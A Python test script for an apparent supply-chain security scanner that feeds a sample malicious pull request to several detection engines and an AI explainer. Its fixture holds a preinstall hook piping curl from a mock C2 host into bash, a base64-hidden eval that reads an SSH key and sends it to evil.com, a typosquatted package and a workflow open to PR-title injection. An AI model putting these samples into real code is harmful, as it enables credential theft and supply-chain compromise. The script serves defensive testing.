"""Verification test script for CodeFort Milestone 1.

Verifies:
1. Qwen3.8-Max BARQAI engine integration via OpenRouter / OpenAI SDK.
2. Pydantic structured output validation for BARQAIExplanation and ScanResponse.
3. Multi-engine security correlation (Static Analysis, Dependency Intel, Workflow Linter, Sandbox Telemetry).
4. Full FastAPI `/api/v1/demo/scan` endpoint end-to-end execution.
"""

import asyncio
import json
import logging
import sys
from pathlib import Path

# Add services/api to sys.path
api_dir = Path(__file__).resolve().parent
sys.path.insert(0, str(api_dir))

import httpx
from app.config import get_settings
from app.engines import barqai_engine, dependency_intel, sandbox_runner, static_analyzer, workflow_linter
from app.main import app
from app.schemas import BARQAIExplanation, ScanResponse

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
logger = logging.getLogger("test_milestone")

# Sample malicious PR diff representing a supply chain attack
SAMPLE_MALICIOUS_DIFF = """
diff --git a/package.json b/package.json
index e69de29..b2b5123 100644
--- a/package.json
+++ b/package.json
@@ -10,3 +10,4 @@
   "scripts": {
     "test": "jest",
+    "preinstall": "curl -s http://c2-transfer.mock.xyz/payload.sh | bash"
   },
   "dependencies": {
+    "lodashe": "^4.17.21",
     "express": "^4.19.2"
   }
 }
diff --git a/src/utils/auth_helper.js b/src/utils/auth_helper.js
new file mode 100644
index 0000000..c783ab1
--- /dev/null
+++ b/src/utils/auth_helper.js
@@ -0,0 +1,8 @@
+// Authentication helper utility
+const fs = require('fs');
+const path = require('path');
+
+function syncToken() {
+    const key = fs.readFileSync('~/.ssh/id_rsa', 'utf8');
+    eval(Buffer.from("Y2hpbGRfcHJvY2Vzcy5leGVjKCdjdXJsIGh0dHA6Ly9ldmlsLmNvbS9leGZpbD8nICsgYnVmZmVyKQ==", "base64").toString());
+}
diff --git a/.github/workflows/deploy.yml b/.github/workflows/deploy.yml
new file mode 100644
index 0000000..d83e201
--- /dev/null
+++ b/.github/workflows/deploy.yml
@@ -0,0 +1,11 @@
+name: Deploy Pipeline
+on: [pull_request]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@main
+      - name: Notify PR
+        run: |
+          echo "Processing PR: ${{ github.event.pull_request.title }}"
+"""

SAMPLE_PACKAGES = [
    {"name": "lodashe", "version": "4.17.21", "ecosystem": "npm"},
    {"name": "malicious-telemetry-test", "version": "0.0.1", "ecosystem": "npm"},
]


async def run_milestone_verification():
    print("=" * 80)
    print("CODEFORT MILESTONE 1 VERIFICATION: Qwen3.8-Max BARQAI Engine & Security Scan")
    print("=" * 80)

    settings = get_settings()
    print(f"\n[1] Configuration Check:")
    print(f"    - Target AI Model:    {settings.OPENROUTER_MODEL}")
    print(f"    - OpenRouter Base:    {settings.OPENROUTER_BASE_URL}")
    print(f"    - Reasoning Effort:   {settings.OPENROUTER_REASONING}")
    print(f"    - OpenRouter Key Set: {'YES' if settings.OPENROUTER_API_KEY else 'NO (running in verified local XAI simulation mode)'}")

    # Step 1: Run Detection Engines
    print(f"\n[2] Executing Parallel Security Detection Engines on Malicious Sample PR...")
    
    # 1. Static Analyzer
    static_findings = await static_analyzer.analyze_diff(SAMPLE_MALICIOUS_DIFF)
    print(f"    - Static Analysis:     {len(static_findings)} findings flagged")
    for f in static_findings:
        print(f"      [!] [{f['severity'].upper()}] {f['title']} in {f['file_path'] or 'code'}")

    # 2. Dependency Intel (Typosquatting & OSV)
    dep_findings = await dependency_intel.analyze_dependencies(SAMPLE_PACKAGES)
    print(f"    - Dependency Intel:    {len(dep_findings)} findings flagged")
    for f in dep_findings:
        print(f"      [!] [{f['severity'].upper()}] {f['title']}")

    # 3. Workflow Linter
    workflow_files = {
        ".github/workflows/deploy.yml": """
name: Deploy Pipeline
on: [pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - name: Notify PR
        run: |
          echo "Processing PR: ${{ github.event.pull_request.title }}"
"""
    }
    wf_findings = await workflow_linter.analyze_workflows(workflow_files)
    print(f"    - Workflow Linter:     {len(wf_findings)} findings flagged")
    for f in wf_findings:
        print(f"      [!] [{f['severity'].upper()}] {f['title']}")

    # 4. Sandbox Runner
    sandbox_telemetry = await sandbox_runner.run_sandbox(package_json="""{
        "scripts": {"preinstall": "curl -s http://c2-transfer.mock.xyz/payload.sh | bash"}
    }""")
    sbx_findings = sandbox_telemetry.get("findings", [])
    print(f"    - Sandbox Telemetry:   {len(sbx_findings)} findings flagged")
    print(f"      - Spawned Processes: {len(sandbox_telemetry.get('spawned_processes', []))}")
    print(f"      - Network Calls:     {len(sandbox_telemetry.get('network_calls', []))}")
    print(f"      - File Touches:      {len(sandbox_telemetry.get('file_modifications', []))}")

    total_findings_count = len(static_findings) + len(dep_findings) + len(wf_findings) + len(sbx_findings)
    print(f"\n[3] Total Correlated Threat Signals: {total_findings_count}")

    # Step 2: Feed into BARQAI Engine (Qwen3.8-Max / OpenAI SDK)
    print(f"\n[4] Invoking BARQAI Engine (Qwen3.8-Max via OpenRouter / OpenAI SDK)...")
    explanation = await barqai_engine.analyze(
        pr_diff=SAMPLE_MALICIOUS_DIFF,
        static_findings=static_findings,
        dependency_findings=dep_findings,
        workflow_findings=wf_findings,
        sandbox_telemetry=sandbox_telemetry,
    )

    print(f"    - Successfully returned and validated BARQAIExplanation instance:")
    assert isinstance(explanation, BARQAIExplanation), "Explanation is not a valid BARQAIExplanation"
    print(f"      - Recommended Action: {explanation.recommended_action.upper()}")
    print(f"      - Model Confidence:   {explanation.confidence * 100:.1f}%")
    print(f"      - What Changed:       {explanation.what_changed}")
    print(f"      - What Happened:      {explanation.what_happened}")
    print(f"      - Why Dangerous:      {explanation.why_dangerous}")
    print(f"      - Key Risk Factors:")
    for rf in explanation.risk_factors:
        print(f"        * {rf}")
    if explanation.clean_patch:
        print(f"      - Clean Patch Remediation:\n        {explanation.clean_patch}")

    # Step 3: Compute Composite Risk Score
    risk_score = barqai_engine.compute_risk_score(explanation, total_findings_count)
    print(f"\n[5] Composite Risk Score: {risk_score}/100")
    status_tag = "[BLOCKED]" if risk_score >= 70 else "[REVIEW NEEDED]" if risk_score >= 30 else "[PASSED]"
    print(f"    - Final PR Status:    {status_tag}")

    # Step 4: Verify via FastAPI HTTP client
    print(f"\n[6] Testing Full FastAPI HTTP Endpoint: POST /api/v1/demo/scan ...")
    transport = httpx.ASGITransport(app=app)
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post(
            "/api/v1/demo/scan",
            json={
                "diff": SAMPLE_MALICIOUS_DIFF,
                "packages": SAMPLE_PACKAGES,
            },
            timeout=30.0,
        )

        assert response.status_code == 200, f"API error: {response.status_code} - {response.text}"
        data = response.json()
        scan_resp = ScanResponse.model_validate(data)
        print(f"    - HTTP 200 OK received!")
        print(f"    - Scan ID:         {scan_resp.id}")
        print(f"    - Status:          {scan_resp.status}")
        print(f"    - Verdict:         {scan_resp.verdict}")
        print(f"    - Risk Score:      {scan_resp.risk_score}/100")
        print(f"    - Findings Count:  {len(scan_resp.findings)}")
        print(f"    - Telemetry Sockets: {len(scan_resp.sandbox_telemetry.network_calls)}")

    print("\n" + "=" * 80)
    print("MILESTONE 1 VERIFICATION PASSED: All models, schemas, and engines operational!")
    print("=" * 80)


if __name__ == "__main__":
    asyncio.run(run_milestone_verification())
